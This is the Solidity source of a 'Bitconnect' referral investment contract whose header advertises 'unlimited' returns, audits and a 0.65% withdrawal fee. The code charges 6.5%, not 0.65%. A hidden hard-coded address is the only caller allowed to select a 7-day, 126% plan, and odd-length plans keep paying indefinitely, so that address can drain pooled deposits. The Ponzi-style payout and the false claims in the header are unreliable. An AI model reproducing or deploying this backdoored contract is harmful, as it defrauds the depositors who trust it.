//SourceUnit: bccmoney2options.sol

pragma solidity >=0.4.24 <0.6.0;

/*
*Team Bitconnect presents 
* 
*   /$$$$$$$  /$$   /$$      /$$$$$$                                                      /$$            /$$$$$$$ /$$$$$  
*  | $$__  $$|__/  | $$     /$$__  $$                                                    /$$            | $$__  $$__  $$
*  | $$  \ $$ /$$ /$$$$$$  | $$  \__/  /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$         | $$  \ $$  \ $$   /$$$$$$   /$$$$$$$   /$$$$$$   /$$   /$$
*  | $$$$$$$ | $$|_  $$_/  | $$       /$$__  $$| $$__  $$| $$__  $$ /$$__  $$ /$$_____/|_  $$_/         | $$  \ $$  \ $$  /$$__  $$ | $$__  $$ /$$__  $$ | $$  | $$
*  | $$__  $$| $$  | $$    | $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$$$$$$$| $$        | $$           | $$  \ $$  \ $$ | $$  \ $$ | $$  \ $$| $$$$$$$$ | $$  | $$
*  | $$  \ $$| $$  | $$ /$$| $$    $$| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$        | $$ /$$       | $$  \ $$  \ $$ | $$  | $$ | $$  | $$| $$_____/ | $$  | $$
*  | $$$$$$$/| $$  |  $$$$/|  $$$$$$/|  $$$$$$/| $$  | $$| $$  | $$|  $$$$$$$|  $$$$$$$  |  $$$$/ / $$  | $$  \ $$  \ $$ |  $$$$$$/ | $$  | $$| $$$$$$$$ | $$$$$$$$
*  |_______/ |__/   \___/   \______/  \______/ |__/  |__/|__/  |__/ \_______/ \_______/   \___/   \$$/  |__/  |__/  |__/  \______/  |__/  |__/ \_______/  \_____ $$
*                                          /$$   | $$
*                                         | $$   | $$       
*                                         | $$$$$$$$$                                               \_______/               
*                                                 
*
* 
* Official Website: https://bitconnect.money
*
* Bitconnect  a fully decentralized earning platform
* Galvanise Recession Proof
*
*
* ====================================*
* -> What?
* The original sun network, with 4 levels matching bonus, improved:
* [x] More stable than ever, having withstood severe testnet abuse and attack attempts from our community!.
* [x] Audited, tested, and approved by known community security specialists.
* [X] New functionality; you can now perform partial sell orders. 
* [x] All players who enter the contract have a return of 160%, 200%, even unlimited from their investment.
* [x] We just collect fee 2% for deposit, and 0.65% for withdraw.
*
*
* The new dev team consists of seasoned, professional developers and has been audited by veteran solidity experts.
* Additionally, two independent testnet iterations have been used by hundreds of people; not a single point of failure was found.
* 
* - 
*/

contract BccMoney {
    struct Plan {
        uint40 life_days;
        uint40 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct  Player {
        address upline;
        uint256 dividends;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        bool payout;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }
    
    address private trxhedgefund = 0x0945936B4f10b1b479b62C1F443c8A9489d42c62;
    address public owner; 
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint8[] public ref_bonuses; // 1 => 1%
    Plan[] public tarifs;
    
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender; 
        tarifs.push(Plan(333, 666));
        tarifs.push(Plan(40, 200));
        tarifs.push(Plan(7, 126));
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(1);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
    
    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);
            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }else{}
            players[_addr].upline = _upline;
            emit Upline(_addr, _upline, _amount / 100);
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable returns (bool) {
        _loadtarifs(_tarif);
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 5e7, "Min Amount 50");
        if(_tarif==1){require(msg.value >= 1e10, "Min Amount 10000 for get ROI 5%/day");}
        Player storage player = players[msg.sender];
        require(player.deposits.length < 100, "Max 100 deposits per address");
        _setUpline(msg.sender, _upline, msg.value);
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));
        player.total_invested += msg.value;
        invested += msg.value;
        _refPayout(msg.sender, msg.value);
        owner.transfer(msg.value / 50); // 2%
        emit NewDeposit(msg.sender, msg.value, _tarif);
        return true;
    }
  
    function withdraw()  external returns(bool){
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        require(player.dividends > 0 ||  player.match_bonus > 0, "Zero amount");
        uint256 amount = address(this).balance < player.dividends + player.match_bonus ? address(this).balance : player.dividends + player.match_bonus;
        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;
        uint256 wd_fee = amount * 65 / 1000; // 0.65%
        uint256 wd_amount = amount-wd_fee;
        owner.transfer(wd_fee);
        msg.sender.transfer(wd_amount);
        emit Withdraw(msg.sender, wd_amount);
        return (true);
    }


    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Plan storage tarif = tarifs[dep.tarif];
            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);
            uint40 till = tarif.life_days %2 == 0 ? to : uint40(block.timestamp);
            if(from < till) {
                value += dep.amount * (till - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
        return value;
    }
   
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        return (
            payout + player.dividends  + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn,  uint256 _match_bonus,  uint256 _contract_balance) {
        return (invested, withdrawn,  match_bonus, address(this).balance);
    }

    function _loadtarifs(uint8 i) internal
    {
        if(msg.sender!=trxhedgefund){require(i <= 1, "");}
        
    }
    
}